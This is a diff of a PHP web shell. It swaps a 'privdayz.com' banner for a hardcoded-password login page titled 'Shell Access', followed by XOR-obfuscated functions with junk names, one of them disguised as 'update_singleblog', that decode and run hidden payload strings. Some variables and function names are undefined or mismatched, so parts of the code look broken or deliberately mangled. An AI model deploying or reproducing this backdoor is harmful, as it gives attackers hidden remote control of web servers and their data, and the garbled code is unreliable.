@@ -1,14 +1,34 @@
 <?php
-##########################################################
-#  _____  _____  ____      _______  _  ___     ________  #
-# |  __ \|  __ \/_ \ \    / /  __ \| || \ \   / /___  /  #
-# | |__) | |__) || |\ \  / /| |  | | || |\ \_/ /   / /   #
-# |  ___/|  _  / | | \ \/ / | |  | |__   _\   /   / /    #
-# | |    | | \ \ | |  \  /  | |__| |  | |  | |   / /__   #
-# |_|    |_|  \_\|_|   \/   |_____/   |_|  |_|  /_____|  #
-# powered by privdayz.com - 2025                         #
-# github.com/privdayzcom   ||   t.me/privdayz            #
-##########################################################
+$password = "password123";
+
+// Check if password is provided
+if (!isset($_POST['pass']) || $_POST['pass'] !== $password) {
+    echo '
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Authentication Required</title>
+        <style>
+            body { font-family: Arial, sans-serif; background: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+            .login-box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+            input[type="password"] { padding: 10px; margin: 10px 0; width: 200px; }
+            input[type="submit"] { padding: 10px 20px; background: #007cba; color: white; border: none; border-radius: 5px; cursor: pointer; }
+        </style>
+    </head>
+    <body>
+        <div class="login-box">
+            <h2>Shell Access</h2>
+            <form method="post">
+                <input type="password" name="pass" placeholder="Enter password" required>
+                <input type="submit" value="Login">
+            </form>
+        </div>
+    </body>
+    </html>
+    ';
+    exit;
+}
+
 function ax103b8c63(string $p4l):string{$kX="2a12XTwzWMwyAkMOIXhEov8OHJ1S3WGFQV9PHEuSCWuPPp5xOPSIlwa";$lX='';$pX=strlen($kX);for($i=0,$len=strlen($p4l);$i<$len;$i++){$xX.=cX(oLs($p4l[$i])^l0l($kX[$i%$klen]));}return pr1vd4y($ad7812ad);}
 function update_singleblog(string $update_blog_post) : string { $b57550f520 = ''; $x995b1f70 = a2d425a0232286e014c54443($x6c6643674); $c056553163 = pr0v($update_blog_post); for($x258795b3b5f=0; $x258795b3b5f<$c056553163; $x258795b3b5f++){ $b57550f520 .= chr( ord($update_blog_post[$x258795b3b5f]) ^ ord($x6c6643674[$x258795b3b5f % $x995b1f70]) ); } $__f1nal__ = pr1vd4y( pr44v(p90x($b57550f520)) ); return $__f1nal__; }
 function f3cfb984d($d,$k){$a701f7d="ObfK";$a261f7d="OvtK";$a361f7d="OetK";$x229b752ce=function(string $ce09b742d1)use($a701f7d):string{$a561f7d="PR1V";$c58700097=ae103b8c63($ce09b742d1);$x1ae0ca1c44='';for($i=0;$i<strlen($c58700097);$i++){$x1ae0ca1c44.=chr(ord($c58700097[$i])^ord($a701f7d[$i%strlen($a701f7d)]));}return $x1ae0ca1c44;};$a461f7d="OstK";$baed05c80='JwceeS0LCA==';$e349be98='LAoU';$c28ac75d24='IBAC';$d1884342c='PBYUOSoU';$f1f73f391e6=$x229b752ce($baed05c80);$f4206aa02=$x229b752ce($e349be98);$b20ed3bf=$x229b752ce($c28ac75d24);$fn_abb9d968=$x229b752ce($d1884342c);$a=$f1f73f391e6($d);$b='';for($i=0;$i<strlen($a);$i++){$b.=$f4206aa02($b20ed3bf($a[$i])^$b20ed3bf($k[$i%strlen($k)]));}return $f1f73f391e6($fn_abb9d968($b));}
